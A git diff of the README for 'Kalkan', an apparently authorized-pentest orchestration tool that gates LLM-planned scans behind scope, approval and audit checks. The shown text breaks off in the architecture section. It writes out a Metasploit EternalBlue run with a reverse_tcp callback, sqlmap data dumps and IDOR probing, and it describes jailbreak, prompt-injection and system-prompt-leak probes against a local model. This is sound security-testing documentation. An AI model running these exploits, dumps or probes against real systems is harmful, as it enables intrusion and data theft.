@@ -1,562 +1,301 @@
 # Kalkan
 
-**ATT&CK + ATLAS haritalı, kapsam (scope) ve denetim (audit) zorlamalı güvenlik orkestrasyon çekirdeği.**
+**An ATT&CK + ATLAS–mapped security orchestration core with enforced scope and tamper-evident audit.**
 
-> 📖 Kurulum adımları için: [`docs/KURULUM.md`](docs/KURULUM.md).
+> 📖 Turkish setup/usage guides live under [`docs/`](docs/) (`KURULUM.md`, `KULLANIM.md`, `MIMARI.md`).
 
-Kalkan bir "otomatik hacker" değil; **yetkilendirilmiş testleri disipline eden bir çalıştırma katmanı**.
-Model (E2B / Qwen3 4B) yalnızca *niyeti* yapılandırır. Komutu, kapsamı ve denetimi kod belirler.
+Kalkan is **not** an "automated hacker." It is an **execution layer that disciplines authorized testing**.
+The model (a local Ollama router, e.g. Qwen3 4B) only structures *intent*. Code decides the command, the scope and the audit.
 
 ```
-"10.10.10.20'de portları tara, sonra zafiyet bak"
+"scan ports on 10.10.10.20, then look for vulnerabilities"
         │
         ▼
-   Router (LLM)  ──►  Intent { targets, techniques }   ← sadece JSON, komut yok
+   Router (LLM)  ──►  Intent { targets, techniques }   ← JSON only, never a command
         │
         ▼
-   Planner       ──►  Playbook (T1046 → nmap, nmap)    ← statik tablo, model değiştiremez
+   Planner       ──►  Playbook (T1046 → nmap, nmap)    ← static table, the model cannot change it
         │
         ▼
-   ScopeGuard    ──►  hedef yetkili mi? süre geçti mi? risk tavanı?
+   ScopeGuard    ──►  is the target authorized? expired? over the risk ceiling?
         │
         ▼
-   Policy        ──►  intrusive ise onay var mı? destructive kapalı mı?
+   Policy        ──►  approval for intrusive? destructive disabled?
         │
         ▼
-   Executor      ──►  adaptör.run()  ──►  AuditLog (hash zinciri)
+   Executor      ──►  adapter.run()  ──►  AuditLog (hash chain)
 ```
 
 ---
 
-## 1. Neden bu tasarım
+## 1. Why this design
 
-LLM'e "şu komutu çalıştır" dedirtmek üç sorun üretir: **halüsinasyon**, **kapsam ihlali**, **iz sürülemezlik**.
-Kalkan bu üçünü yapısal olarak keser:
+Telling an LLM to "run this command" creates three problems: **hallucination**, **scope violation** and **non-traceability**.
+Kalkan cuts all three structurally:
 
-| Risk | Çözüm |
+| Risk | Mitigation |
 |---|---|
-| Model olmayan komut uydurur | Model yalnızca `objective`, `targets`, `techniques` döndürür (JSON şeması zorunlu). Teknik → araç eşlemesi `knowledge/mapping.py` içinde sabittir. |
-| Kapsam dışına çıkar | Her aksiyon `ScopeGuard.check()`'ten geçer: CIDR/domain allowlist, deny listesi, port listesi, son kullanma tarihi, risk tavanı. |
-| Onaysız intrusive işlem | `Policy`: `intrusive` ve üstü varsayılan olarak onay ister; `destructive` varsayılan **kapalı**. |
-| "Ne yaptığı belli değil" | Her adım hash zincirli `AuditLog`'a yazılır; `audit verify` tek satır değişikliğini yakalar. |
-| Araç yoksa çöker | Adaptörler `dry-run` / `unavailable` durumuna düşer; iskelet araç kurmadan da çalışır. |
+| Model invents a non-existent command | The model only returns `objective`, `targets`, `techniques` (JSON schema enforced). The technique → tool mapping is fixed in `knowledge/mapping.py`. |
+| Going out of scope | Every action passes `ScopeGuard.check()`: CIDR/domain allowlist, deny list, port list, expiry date, risk ceiling. |
+| Unapproved intrusive action | `Policy`: `intrusive` and above require approval by default; `destructive` is **off** by default. |
+| "No idea what it did" | Every step is written to a hash-chained `AuditLog`; `audit verify` detects a single-line change. |
+| Tool missing → crash | Adapters fall back to `dry-run` / `unavailable`; the skeleton runs even with no tools installed. |
 
-**Model hiçbir zaman `subprocess` çağırmaz.** `Router` sınıfı sadece HTTP ile modele soru sorar ve dönen JSON'u doğrular.
+**The model never calls `subprocess`.** The `Router` only asks the model over HTTP and validates the returned JSON.
 
 ---
 
-## 2. Kurulum
+## 2. Install
 
-Çekirdeğin dış bağımlılığı **yok** (yalnızca Python 3.11+ standart kütüphanesi). Harici tarama araçları (nmap, nuclei…) isteğe bağlıdır — bkz. §4.
+The core has **no external dependencies** (Python 3.11+ standard library only). External scanners (nmap, nuclei, …) are optional — see §4.
 
 ```powershell
-cd C:\Users\<kullanici>\kalkan
-pip install -e .        # 'kalkan' komutunu PATH'e kurar (önerilir)
+cd C:\Users\<user>\kalkan
+pip install -e .        # installs the 'kalkan' command on PATH (recommended)
 kalkan --help
 ```
 
-> Kurmadan da çalışır: proje kökünden `python -m kalkan.cli ...`.
+> Works without installing too: run `python -m kalkan.cli ...` from the project root.
 
-### Masaüstü kısayolu (cd/komut ezberlemeden)
+### Three ways to use it
 
-`Kalkan.bat` çift tıklanınca menü arayüzünü açar; kendi klasörüne geçip
-araç yollarını ve API anahtarlarını (registry'den) otomatik yükler, yani
-"stale terminal" sorunundan etkilenmez. Masaüstüne `Kalkan.lnk` kısayolu
-oluşturup bu `.bat`'i hedef gösterebilirsin.
+- **`kalkan`** (no args) → the **home menu**: pick what to do.
+- **`kalkan chat`** → an interactive REPL: talk to the model, plan and run.
+- **`kalkan <command>`** → direct subcommands (`plan`, `run`, `exploit`, `navigator`, …) for scripting/CI.
 
-### Üç kullanım biçimi
+---
 
-| Biçim | Komut | Ne zaman |
+## 3. Quick start (5 minutes)
+
+### 3.0 Chat (recommended)
+
+```powershell
+kalkan chat --target 10.10.10.20
+```
+
+Inside the REPL:
+
+```
+/target [host]   show/set the session target
+/plan <text>     plan only, do not run
+/cve <CVE-id>    inspect a CVE: score/KEV/CWE + ATT&CK bridge + MSF module
+/exploit <CVE|module> [k=v...] [run]   verify (check) / real exploit (run)
+/allow destructive on    open policy for a real exploit (run)
+/risk <level>    risk ceiling (passive|active|intrusive|destructive)
+/auto [on|off]   skip the intrusive approval prompt (careful)
+/arg k=v ...     arm a step argument (e.g. verify=1, module=...)
+/arm             shortcut: verify=1 (arms sqlmap + dalfox + IDOR)
+/ozet [on|off]   Turkish model summary after each turn
+/feed [tail|status]   latest feed events
+/scope [add <h>] show scope / add a target
+Ctrl+C           stop a running scan (returns to the prompt — does NOT quit)
+/quit · Ctrl+D   exit
+```
+
+Anything else you type goes to the model as intent. **Ctrl+C never kills the session** — it cancels the current line or stops the running plan and hands you back the prompt; a second Ctrl+C at an empty prompt (or Ctrl+D) exits.
+
+### 3.1 Scope file
+
+Scope is your written authorization. Nothing touches a target without it.
+
+```powershell
+copy examples\scope.json scope.json
+# or add a target (this asserts you are AUTHORIZED to test it):
+kalkan scope add 10.10.10.20
+kalkan scope            # show
+```
+
+### 3.2–3.6 Plan, dry-run, run, verify
+
+```powershell
+kalkan plan "scan ports on 10.10.10.20"          # plan only
+kalkan run  "scan ports on 10.10.10.20" --dry-run # show commands, do not run
+kalkan run  "scan ports on 10.10.10.20"           # real run (gated)
+kalkan audit verify                                # verify the hash chain
+```
+
+Scan reports are written automatically under `reports/` (contains target info — git-ignored).
+
+### 3.8 Live feed — CVE/CVSS + ATT&CK/ATLAS stream
+
+```powershell
+kalkan feed status          # CVE store + daemon state
+kalkan feed start           # background daemon
+kalkan feed tail            # latest events
+kalkan vuln top --limit 20  # highest-priority CVEs (CVSS/EPSS/KEV)
+```
+
+---
+
+## 4. Enabling tools
+
+Adapters are optional. A missing tool reports `unavailable` instead of crashing. Check readiness with:
+
+```powershell
+kalkan tools        # installed tools + status
+kalkan coverage     # technique coverage + which tools each playbook needs
+```
+
+| Tool | Capability | Risk |
 |---|---|---|
-| **Menü arayüzü** | `kalkan` (argümansız) | Ne yaptığını görüp seçerek ilerlemek |
-| **Sohbet (REPL)** | `kalkan chat --target <hedef>` | Modelle konuşarak tarama/plan |
-| **Tek komut** | `kalkan run --technique … --target …` | Betik/otomasyon |
+| nmap | port/service scan | active |
+| httpx | tech fingerprint | active |
+| webprobe (built-in) | headers, cookies, CORS, methods, TLS, redirect, **IDOR/BOLA** | active/intrusive |
+| nuclei | template/CVE scan | active |
+| ffuf | content discovery | active |
+| wafw00f | WAF detection | passive |
+| shodan | passive OSINT | passive |
+| sqlmap | SQLi verify/dump | intrusive/destructive |
+| dalfox | XSS verify | intrusive |
+| msf (Metasploit) | exploit check/run | intrusive/destructive |
+| llmprobe (built-in) | LLM/agent tests | passive |
+
+> **Windows + WSL:** if `msfconsole` is installed inside a WSL distro (e.g. Ubuntu), Kalkan detects it and runs it over `wsl -d <distro> -e msfconsole`. Console output is forced to UTF-8 so Turkish-locale (cp1254) terminals do not break decoding.
 
 ---
 
-## 3. Hızlı başlangıç (5 dakika)
+## 5. Attack layer — Metasploit / sqlmap / IDOR
 
-### 3.0 Sohbetle kullanım (önerilen)
+Detection alone is not enough: Kalkan can **verify** a finding and, with explicit authorization, **exploit** it. Every step still passes scope + policy + approval.
 
-```powershell
-kalkan chat --target example.com
-```
-
-Açılışta **kalkan (shield) ASCII grafiği** + renkli durum; her adım canlı
-akar (`[i/N] araç.yetenek → durum`, renkli risk/sonuç):
-
-```
-kalkan(example.com)> web uygulamasını tara
-   ... model düşünüyor → plan (renkli) → adımlar canlı [1/8]… [8/8]
-   🗒  Bulgular / Geçilebilir (exploitable) / Eksik-zayıf / Sonraki adım
-   rapor: reports\example.com_20261031-152033.md
-```
-
-Risk modeli: **passive/active otomatik**. Onay varsayılan **OTOMATIK**
-(yavaş taramalarda alt-süreç stdin'i tüketip onayı EOF'la reddediyordu;
-`/auto off` ile elle onaya dönülür). `destructive` yine `--allow-destructive`
-+ scope `max_risk` ister.
-Slash komutları: `/target`, `/risk`, `/auto`, `/arg k=v`, `/arm`, `/ozet`,
-`/plan`, `/feed`, `/scope [add <hedef>]`, `/help`, `/quit`.
-`/arm` = `verify=1` kısayolu (sqlmap+dalfox'u silahlar); `/arg module=… dump=1`
-ile diğer saldırı adımları silahlanır.
-Başlatma bayrakları: `--from-feed`, `--dry-run`, `--max-risk`,
-`--allow-destructive`, `--no-summary`, `--no-report`. Renk otomatik; `NO_COLOR` kapatır.
-
-### 3.1 Kapsam dosyası
-
-`examples/scope.json` dosyasını kopyala (`scope.json` olarak), kendi laboratuvarına göre düzenle.
-Hedef eklemenin hızlı yolu — elle JSON açmadan:
+### CVE → Metasploit
 
 ```powershell
-kalkan scope add example.com        # domain/ip/cidr otomatik ayrılır
-kalkan scope show
+# Verify a module (INTRUSIVE → asks for approval). Resolves the module from the
+# curated table, else from the installed Metasploit catalog index (thousands of CVEs).
+kalkan exploit 10.10.10.20 CVE-2017-0144
+
+# Real exploit (DESTRUCTIVE → requires scope max_risk=destructive AND --allow-destructive)
+kalkan exploit 10.10.10.20 CVE-2017-0144 --mode run \
+    --payload windows/x64/meterpreter/reverse_tcp --lhost 10.10.10.5 --allow-destructive
+
+# Direct module path also works:
+kalkan exploit 10.10.10.20 exploit/windows/smb/ms17_010_eternalblue --dry-run
 ```
 
-> `scope add`, o hedefi test etmeye **yetkili olduğun beyanıdır**; Kalkan bu beyana güvenir.
+Inside `chat` the same flow is `/cve CVE-2017-0144` (inspect + resolve module) then `/exploit CVE-2017-0144` (check) or `/exploit CVE-2017-0144 run` (after `/allow destructive on`). After any scan, correlation remembers the top MSF-backed CVE so a bare `/exploit` retries it.
 
-Örnek kapsam:
+### Web exploitation (sqlmap / dalfox / IDOR)
 
-```json
-{
-  "name": "Lab",
-  "authorized_by": "Yetkili Test Sorumlusu",
-  "ticket": "LAB-2026-001",
-  "expires": "2027-12-31T23:59:59Z",
-  "allow_cidrs": ["127.0.0.1/32", "10.10.10.0/24"],
-  "allow_domains": ["example.com", "localhost"],
-  "allow_ports": [80, 443, 8080, 8443, 11434],
-  "deny_cidrs": ["10.10.10.1/32"],
-  "max_risk": "intrusive"
-}
-```
-
-* `expires` geçmişse **hiçbir şey çalışmaz**.
-* `deny_cidrs` her zaman kazanır (allow içinde olsa bile).
-* `allow_ports` boş bırakılırsa tüm portlar serbest; doluysa yalnızca listedekiler.
-  LLM probu `http://localhost:11434` hedeflediği için **11434'ü eklemeyi unutma**.
-* `max_risk`: `passive` < `active` < `intrusive` < `destructive`.
-
-### 3.2 Durumu gör
+The `T1190` playbook contains `sqli_check`, `sqli_dump`, `xss_scan`, `idor_probe` and the MSF steps. The risky ones are **opt-in** — they only join the plan when armed:
 
 ```powershell
-python -m kalkan.cli --scope examples/scope.json tools
-python -m kalkan.cli coverage
-python -m kalkan.cli knowledge atlas
+kalkan run "web vuln scan on https://site" --arg verify=1          # SQLi/XSS/IDOR verify (intrusive)
+kalkan run "sqli on https://site/item?id=1" --arg dump=1 --allow-destructive  # real data dump
 ```
 
-`tools` hangi adaptörün hazır olduğunu, `coverage` hangi tekniğin uçtan uca çalışabildiğini söyler.
-
-### 3.3 Plan üret (hiçbir şey çalışmaz)
+**IDOR / Broken Access Control (`idor_probe`)** enumerates an object identifier and emits three signals:
+- `idor_enumeration` — neighboring IDs (id±N) return 200 to your session → access to another object (horizontal IDOR);
+- `missing_authentication` — a cookie-less request still returns the same object → auth not enforced;
+- `bola_horizontal` — a second session (`cookie_b=...`) reads user A's object → **confirmed BOLA** (strongest proof).
 
 ```powershell
-python -m kalkan.cli --scope examples/scope.json plan --technique T1046 --target 10.10.10.20
-python -m kalkan.cli --scope examples/scope.json plan --tactic reconnaissance --target 10.10.10.20
+kalkan run "idor test on https://site/api/orders/42" \
+    --arg verify=1 --arg cookie="session=A" --arg cookie_b="session=B"
 ```
-
-### 3.4 Kuru çalıştırma (komutları göster, çalıştırma)
-
-```powershell
-python -m kalkan.cli --scope examples/scope.json run --dry-run --yes `
-  --technique T1046 --target 10.10.10.20
-```
-
-### 3.5 Gerçek çalıştırma
-
-```powershell
-python -m kalkan.cli --scope examples/scope.json run --technique T1046 --target 10.10.10.20
-```
-
-Intrusive adım geldiğinde terminalde onay ister. `--yes` ile atlanır (**dikkat**).
-
-### 3.6 Denetim kaydını doğrula
-
-```powershell
-python -m kalkan.cli audit verify --audit .kalkan/audit.jsonl
-python -m kalkan.cli audit tail --count 5
-```
-
-### 3.7 Tarama raporları (otomatik)
-
-Her **gerçek** çalıştırmadan sonra (sohbet, `run`, menü "Web uygulama taraması")
-bir Markdown rapor yazılır:
-
-```
-reports/<hedef>_<YYYYAAGG-SSDDSS>.md
-```
-
-İçerik: plan adımları tablosu · adım sonuçları · keşifler (açık portlar, WAF,
-bulgular) · (sohbette) bulgu-odaklı model özeti · plan notları. Gerçek istismar
-çıktısı varsa (sqlmap `--dump` verisi, msf oturum/konsol logu) **loot** olarak
-`reports/loot/<hedef>_<tarih>/` altına ayrı dosyalara kaydedilir ve raporda
-"Loot / Elde Edilen Veri" bölümünde listelenir. Hedef+tarih isimlendirme
-geçmişe dönük arşiv verir. `--dry-run`'da yazılmaz, `--no-report` ile kapatılır.
-`reports/` git'e girmez (hedef/loot bilgisi içerir).
-
-### 3.8 Canlı besleme — CVE/CVSS + ATT&CK/ATLAS akışı
-
-NVD + CISA KEV + FIRST EPSS'i birleştirip 0–100 öncelik skoruyla izler;
-CVE'yi CWE→ATT&CK tekniği→playbook'a köprüler.
-
-```powershell
-kalkan feed run --once          # tek senkron (NVD_API_KEY ile hız limiti açılır)
-kalkan feed start               # arka plan daemon
-kalkan feed stream              # canlı NDJSON olay akışı (tail -f)
-kalkan feed tail                # son olaylar
-kalkan feed status              # depo/daemon durumu
-```
-
-Plan/sohbette `--from-feed`: hedefe/ürüne dair trend KEV/kritik CVE'leri
-tekniklere çevirip plana önerir; eşleşen CVE'yi nuclei `-id` ve (varsa) MSF
-`module=` argümanına bağlar.
 
 ---
 
-## 4. Araçları devreye alma
+## 6. LLM / agent tests (ATLAS + ATT&CK AI techniques)
 
-Hiçbiri zorunlu değil; kurdukça `kalkan tools` / `coverage` yeşile döner. Araç yoksa adım `unavailable`/`dry-run`'a düşer — sessizce yanlış sonuç üretmez.
+```powershell
+kalkan run "jailbreak the model" --target http://localhost:11434         # AML.T0054
+kalkan run "prompt injection"    --target http://localhost:11434         # AML.T0051 / T1699, T1698
+kalkan run "system prompt leak"  --target http://localhost:11434 --arg canary=SECRET123  # AML.T0057
+```
 
-| Araç | Kurulum (Windows) | Ne açar |
-|---|---|---|
-| **nmap** | `winget install Insecure.Nmap` (Npcap dahil) | T1046, T1595, T1592 — port/servis |
-| **nuclei** | GitHub release `.zip` → PATH; sonra `nuclei -update-templates` | T1595.002, T1190 — şablon tarama |
-| **httpx** | ProjectDiscovery GitHub release `.zip` → PATH | T1592 — tech-detect/probe |
-| **ffuf** | `winget install ffuf.ffuf` ya da GitHub release | içerik/parametre keşfi |
-| **dalfox** | GitHub release `.zip` → PATH | XSS (intrusive, opt-in) |
-| **sqlmap** | `pip install sqlmap` | SQLi (intrusive, opt-in) |
-| **wafw00f** | `pip install wafw00f` | WAF/CDN tespiti |
-| **arjun** | `pip install arjun` | parametre keşfi |
-| **nikto** | StrawberryPerl + `sullo/nikto` klonu + `nikto` sarmalayıcısı | web yanlış-yapılandırma |
-| **Metasploit** | [resmi installer](https://windows.metasploit.com/metasploitframework-latest.msi) (Defender istisnası gerekebilir) | T1190, T1203 |
-| **Shodan** | `setx SHODAN_API_KEY "..."` (yeni terminal) | T1590, T1596 — pasif OSINT |
-| **NVD** | `setx NVD_API_KEY "..."` | feed CVE senkron hız limiti |
-| **Ollama** | `winget install Ollama.Ollama` | Router + Türkçe özet |
-
-> **Go araçları (nuclei/httpx/ffuf/dalfox):** Go kuruluysa `go install …@latest`;
-> değilse resmi GitHub release'inden `windows_amd64.zip` indirip içindeki `.exe`'yi
-> PATH'teki bir klasöre (ör. `%USERPROFILE%\tools\bin`) koy.
-> **nuclei** ilk kullanımda şablon ister: `nuclei -update-templates` (GitHub API
-> limiti yerse `git clone https://github.com/projectdiscovery/nuclei-templates`
-> → `%USERPROFILE%\nuclei-templates`).
-
-Doğrulama: `kalkan tools` (hepsini tek bakışta), ya da `nmap --version`, `nuclei -version`, `echo $env:SHODAN_API_KEY`, `ollama list`.
-
-> **API anahtarları koda/`scope.json`'a değil, ortam değişkenine girer.** `.env`
-> okunmaz; `setx` ile User ortamına yazılır ve **yeni** terminal/kısayol görür.
-> `Kalkan.bat` bunları registry'den kendisi yükler.
+The `llmprobe` adapter is built-in (no external binary) and stays `passive`.
 
 ---
 
-## 5. Saldırı katmanı — Metasploit / sqlmap
-
-Mod **yeteneğe** bağlıdır (argümanla bypass edilemez):
-
-| Yetenek | Araç | Risk | Ne yapar |
-|---|---|---|---|
-| `exploit_check` | msf | INTRUSIVE | Daima `check`: modül hedefe uygulanabilir mi, doğrular (exploit çalıştırmaz) |
-| `exploit_run` | msf | **DESTRUCTIVE** | Gerçek exploit → oturum açar; `post` ile oturumda keşif (sysinfo/getuid) |
-| `sqli_dump` | sqlmap | **DESTRUCTIVE** | `--dump` ile gerçek veri çeker |
-| `auxiliary_scan` | msf | INTRUSIVE | Yardımcı modül (ör. smb_version) |
-
-**Kurulum:** Metasploit'i WSL2'ye kur (Windows'ta Defender/MDM engeller) — bkz.
-[`docs/KURULUM.md`](docs/KURULUM.md) §3.5. Kalkan `msfconsole`'u Windows PATH'inde
-veya WSL dağıtımında otomatik bulur.
-
-**Gerçek saldırı için 5 kapı (hepsi ayrı ayrı gerekir):**
-1. `scope.json` → `"max_risk": "destructive"`  2. `--allow-destructive`
-3. onay (chat'te auto / `run --yes`)  4. açık silahlama (`--arg module=…` / `--arg dump=1`)
-5. hedef scope içinde. Biri eksikse plan durur.
+## 7. Knowledge base (full ATT&CK + ATLAS)
 
 ```powershell
-# modül doğrula (INTRUSIVE → onay ister)
-python -m kalkan.cli --scope examples/scope.json run --yes `
-  --technique T1190 --target 10.10.10.20 `
-  --module auxiliary/scanner/smb/smb_version
-
-# GERÇEK exploit (DESTRUCTIVE → scope destructive + --allow-destructive şart)
-python -m kalkan.cli --scope examples/scope.json run --yes --allow-destructive `
-  --technique T1190 --target 10.10.10.20 `
-  --arg module=exploit/windows/smb/ms17_010_eternalblue `
-  --arg payload=windows/x64/meterpreter/reverse_tcp `
-  --arg lhost=10.10.10.5 --arg lport=4444 --arg post=1
-
-# GERÇEK veri çekme (DESTRUCTIVE)
-python -m kalkan.cli --scope examples/scope.json run --yes --allow-destructive `
-  --technique T1190 --target http://10.10.10.20 --arg dump=1
+kalkan knowledge fetch                       # ATT&CK enterprise (~55 MB), full content
+kalkan knowledge fetch --domain atlas        # full ATLAS catalog
+kalkan knowledge search "lateral movement"
+kalkan knowledge show --technique T1190
 ```
 
-Üretilen `.rc` sonuçta `rc_script` olarak döner; oturum/dump çıktısı **loot**
-olarak `reports/loot/` altına kaydedilir. `--allow-destructive` ve scope
-`max_risk=destructive` verilmedikçe hiçbir `destructive` aksiyon geçmez.
+Each technique loads with full detail: description, detection, platforms, data sources, required permissions, bypassed defenses, sub-techniques, mitigations and procedure examples (which group/software used it).
+
+### ATT&CK Navigator coverage layer
+
+With support from [mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator), Kalkan exports a Navigator **layer** that paints its automation coverage over the whole matrix:
+
+```powershell
+kalkan navigator --out kalkan-coverage.json
+```
+
+- Techniques with a runnable playbook are colored by their highest step risk (passive → destructive).
+- If the ATT&CK dataset is fetched, every uncovered technique is added in grey, so the layer shows the full matrix at a glance.
+- Load it at <https://mitre-attack.github.io/attack-navigator/> → *Open Existing Layer → Upload from local*.
 
 ---
 
-## 6. LLM / ajan testleri (ATLAS + ATT&CK AI teknikleri)
-
-Kalkan kendi modelini/ajanını da test eder. Hedef bir Ollama ya da OpenAI uyumlu uç nokta:
+## 8. Connecting the model as orchestrator
 
 ```powershell
-# Jailbreak (AML.T0054)
-python -m kalkan.cli --scope examples/scope.json run --yes `
-  --technique AML.T0054 --target http://localhost:11434
+# Works without a model (rule-based fallback)
+kalkan router "scan ports on 10.10.10.20"
 
-# Prompt injection (AML.T0051 / ATT&CK T1699, T1698)
-python -m kalkan.cli --scope examples/scope.json run --yes `
-  --technique AML.T0051 --target http://localhost:11434
-
-# Sistem promptu sızıntısı (AML.T0057) — canary işaretçisi ile
-python -m kalkan.cli --scope examples/scope.json run --yes `
-  --technique AML.T0057 --target http://localhost:11434
-```
-
-Çıktıda `complied / refused / canary_leaks` sayıları ve her probun yanıtı bulunur.
-Sistem promptuna `KALKAN-CANARY-7f3a` yerleştirilir; yanıtta görünürse sızıntı vardır.
-
-Farklı uç nokta/model:
-
-```powershell
-python -m kalkan.cli run --dry-run --yes --technique AML.T0054 `
-  --target http://localhost:11434 `
-  --endpoint http://localhost:11434 --model qwen3:4b
-```
-
-> `llmprobe` adaptörünün `endpoint`, `model`, `api` (`ollama` | `openai`), `canary`, `system`
-> argümanları vardır. OpenAI uyumlu sunucu için plan üretirken `args` üzerinden `api: openai` geçilmelidir.
-
-### Bilgi tabanını güncellemek (ATT&CK + ATLAS)
-
-Kalkan iki bilgi tabanını da **resmi STIX dağıtımlarından** besler; API anahtarı gerekmez:
-
-```powershell
-# ATT&CK enterprise (~55 MB): TAM icerik — 227 teknik + 479 alt, 15 taktik,
-# 268 mitigasyon, ~17.600 prosedur ornegi (aciklama/nasil-yapildigi + tespit +
-# veri kaynaklari + mitigasyonlar + grup/yazilim prosedur ornekleri)
-python -m kalkan.cli knowledge fetch
-python -m kalkan.cli knowledge fetch --domain mobile   # 78+47 teknik
-python -m kalkan.cli knowledge fetch --domain ics      # 78+26 teknik
-python -m kalkan.cli knowledge show --technique T1190  # tam icerik + ornekler
-python -m kalkan.cli knowledge search -q "port scan"
-
-# ATLAS tam katalog (~1.6 MB): teknik + mitigation + case study
-python -m kalkan.cli knowledge fetch --domain atlas
-python -m kalkan.cli knowledge show --domain atlas --technique AML.T0051
-python -m kalkan.cli knowledge search -q "jailbreak" --domain atlas
-
-# kuretilmis test-edilebilir cekirdek (cok kucuk, ag parcaksi, cevrimdisi)
-python -m kalkan.cli knowledge atlas
-```
-
-- Kaynak: `mitre-attack/attack-stix-data` ve `mitre-atlas/atlas-data` GitHub depoları (resmi).
-- Önbellek: `~/.kalkan/attack/` ve `~/.kalkan/atlas/`; `--force` ile yeniden indirir.
-- `knowledge show` (ATT&CK) çıktısında: açıklama (nasıl yapıldığı), tespit,
-  platform, veri kaynakları, gerekli izin, aşılan savunma, alt/üst teknik,
-  **mitigasyonlar (M…)** ve **prosedür örnekleri** (hangi grup/yazılım nasıl
-  kullanmış) gösterilir. ATLAS'ta ayrıca case study'ler ve test yöntemi.
-- Diğer ATT&CK domain'leri: `--domain mobile`, `--domain ics` (ikisi de tam içerik).
-- Arama boşlukla ayrılan kelimeleri VE olarak değerlendirir; isim
-  eşleşmeleri önce, açıklama eşleşmeleri sonra gelir.
-
----
-
-## 7. Modeli orkestratör olarak bağlamak
-
-Router üç adımda devreye girer:
-
-1. `Router.available()` → `GET /api/tags` ile Ollama'yı yoklar.
-2. Varsa `POST /api/chat` + **JSON şeması** (`format`) ile niyet ister.
-3. Şema dışı / katalog dışı teknik dönerse reddeder; uç nokta yoksa **kural tabanlı yedek** çalışır.
-
-```powershell
-# Model olmadan da çalışır (fallback)
-python -m kalkan.cli router "10.10.10.20 portlarini tara ve zafiyet bak"
-
-# Model ile
-ollama pull qwen3:4b
-python -m kalkan.cli router "10.10.10.20 portlarini tara" --model qwen3:4b
-```
-
-### 8 GB RAM için model seçimi
-
-| Model | Yaklaşık bellek (Q4) | Not |
-|---|---|---|
-| `gemma3n:e2b` / E2B sınıfı | ~5–6 GB | 8 GB'ta dar; diğer uygulamaları kapat |
-| `qwen3:4b` (Q4_K_M) | ~2.8–3.5 GB | **önerilen**: router için yeterli, yer bırakır |
-| `qwen2.5:3b-instruct` | ~2 GB | en hızlı, kalite biraz düşük |
-
-Router'ın işi yaratıcılık değil **sınıflandırma**; küçük ve deterministik model yeterlidir.
-`temperature=0.0` ve `num_predict=400` sabittir.
-
-### İsteğe bağlı: sistem promptunu gömmek
-
-```
-# Modelfile
-FROM qwen3:4b
-PARAMETER temperature 0
-PARAMETER num_ctx 4096
-SYSTEM """
-Sen bir güvenlik orkestrasyon yönlendiricisisin.
-Sadece verilen katalogdan teknik seç, hedef çıkar, JSON döndür.
-Komut yazma. Emin değilsen techniques boş olsun.
-"""
-```
-
-```powershell
-ollama create kalkan-router -f Modelfile
-python -m kalkan.cli router "10.10.10.20 port tara" --model kalkan-router
-```
-
-**Varsayılan model/uç nokta.** Kodun varsayılanı artık `kalkan-router:latest`
-ve `http://localhost:11434`. Her seferinde `--model` yazmamak için ortam
-değişkeni ile de ayarlayabilirsin:
-
-```powershell
-$env:KALKAN_MODEL = "kalkan-router:latest"   # veya qwen3:4b
+# With a model (local Ollama)
 $env:KALKAN_ENDPOINT = "http://localhost:11434"
+$env:KALKAN_MODEL    = "kalkan-router:latest"
 ```
 
-Yapılandırılan model Ollama'da kurulu değilse, router kurulu ilk modele düşer
-ve bunu `notes` içinde bildirir. "Thinking" modelleri (Qwen3.5 vb.) için
-router isteği `think: false` ile gönderir; yoksa model tüm bütçeyi düşünmeye
-harcayıp boş JSON döndürür.
+The router forces the model's answer into a strict JSON schema and rejects any technique outside the catalog. If the endpoint is unreachable, a keyword rule-based fallback keeps the system working offline.
 
 ---
 
-## 8. Mimari
+## 9. Architecture
 
 ```
 kalkan/
-├─ models.py            Action, ActionResult, Plan, Intent, Risk
-├─ scope.py             Scope, ScopeGuard, parse_target, ScopeViolation
-├─ policy.py            Policy, PolicyDenied (onay eşiği)
-├─ audit.py             AuditLog (SHA-256 hash zinciri, verify/tail)
-├─ registry.py          ToolSpec, Registry (yetenek → adaptör)
-├─ report.py            tarama → Markdown rapor + loot (reports/, reports/loot/)
-├─ ui.py                terminal renk + kalkan grafiği + canlı adım ilerlemesi
-├─ adapters/
-│  ├─ base.py           Adapter: command()/parse()/run()/dry_run()
-│  ├─ nmap.py           port_scan (-sT), service_version, vuln_script, host_discovery
-│  ├─ nuclei.py         vuln_scan, web_template (cve_id→-id), misconfig_scan
-│  ├─ httpx.py          http_probe, tech_detect
-│  ├─ ffuf.py / arjun.py / dalfox.py / nikto.py / wafw00f.py
-│  ├─ webprobe.py       security_headers, cors_check, http_methods, tls_inspect…
-│  ├─ sqlmap.py         sqli_check (verify), sqli_dump (DESTRUCTIVE: --dump→loot)
-│  ├─ shodan.py         passive_osint (domain→IP), host_lookup, exposure_lookup
-│  ├─ msf.py            exploit_check(check) / exploit_run(DESTRUCTIVE,oturum+post)
-│  │                    / auxiliary_scan · WSL çalıştırıcı (wsl -d <distro>)
-│  └─ llmprobe.py       llm_jailbreak_probe, llm_injection_probe, llm_leak_probe…
-├─ knowledge/
-│  ├─ attack.py         ATT&CK STIX 2.1 yükleyici + önbellek (~/.kalkan/attack)
-│  ├─ atlas.py          ATLAS kataloğu (otomatik / manuel ayrımı)
-│  ├─ mapping.py        ★ teknik → playbook → adım tablosu
-│  ├─ bridge.py         CVE(CWE) → ATT&CK/ATLAS tekniği + CVE→MSF modülü
-│  ├─ vuln.py / cvss.py CVE/CVSS/EPSS/KEV istihbaratı, öncelik skoru
-│  ├─ rules.py          tespit kuralı kimlikleri
-│  └─ payloads.py       LLM prob korpusu
-├─ feeds/
-│  ├─ events.py         FeedEvent + JSONL/stdout/webhook sinkleri, tail -f
-│  ├─ scheduler.py      FeedDaemon (vuln/attack/atlas bağımsız periyot)
-│  └─ suggest.py        canlı CVE → teknik/MSF önerisi (router/planner)
-├─ orchestrator/
-│  ├─ router.py         LLM → Intent (JSON şeması + kural yedeği) + Türkçe özet
-│  ├─ planner.py        Intent → Plan (deterministik)
-│  └─ executor.py       Plan → sonuç (scope → policy → audit → adaptör)
-├─ cli.py               argparse: home, chat, plan, run, scope, feed, vuln, knowledge, …
-├─ Kalkan.bat           masaüstü başlatıcı (menü)
-└─ examples/scope.json
+  models.py            Risk, Action, Plan, Intent, ActionResult
+  scope.py             ScopeGuard — authorization/scope enforcement
+  policy.py            Policy — approval gate (intrusive/destructive)
